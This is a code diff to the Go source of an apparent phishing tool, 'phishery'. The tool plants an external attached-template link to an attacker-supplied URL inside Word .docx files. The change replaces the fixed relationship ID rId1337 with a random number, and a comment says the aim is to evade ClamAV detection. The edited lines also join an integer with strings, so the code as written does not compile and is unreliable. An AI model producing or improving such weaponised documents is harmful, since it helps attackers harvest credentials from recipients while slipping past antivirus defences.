@@ -5,6 +5,7 @@ import (
 	"errors"
 	"io/ioutil"
 	"strings"
+	"math/rand"
 
 	"github.com/ryhanson/phishery/archivex"
 )
@@ -53,11 +54,13 @@ func (d *Docx) WriteBadocx(filename string) error {
 func (d *Docx) SetTemplate(url string) error {
 	relsPath := "word/_rels/settings.xml.rels"
 	settingsPath := "word/settings.xml"
+	//random ID to evade AV - CLAM AV picks up 1337
+	rid := rand.Intn(1000)
 
 	settingsRels, err := d.retrieveFileContents(relsPath)
 	if err != nil {
 		// Doesn't exist, create it
-		d.newFiles[relsPath] = newSettingsRels(url)
+		d.newFiles[relsPath] = newSettingsRels(url, rid)
 	} else {
 		// TODO: Check if template already exists and update
 		d.newFiles[relsPath] = settingsRels
@@ -71,7 +74,7 @@ func (d *Docx) SetTemplate(url string) error {
 
 	start := "/>"
 	end := "<w"
-	templateNode := start + `<w:attachedTemplate r:id="rId1337"/>` + end
+	templateNode := start + `<w:attachedTemplate r:id="rId` + rid + `"/>` + end
 	settingsXml := strings.Replace(string(settingsBytes), start + end, templateNode, 1)
 	d.newFiles[settingsPath] = []byte(settingsXml)
 
@@ -98,11 +101,11 @@ func (d *Docx) retrieveFileContents(filename string) ([]byte, error) {
 	return ioutil.ReadAll(reader)
 }
 
-func newSettingsRels(url string) []byte {
+func newSettingsRels(url string, rid int) []byte {
 	newRels :=
 		`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 		<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
-			<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+			<Relationship Id="rId` + rid + `" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
 			Target="`+url+`"
 			TargetMode="External"/>
 		</Relationships>`
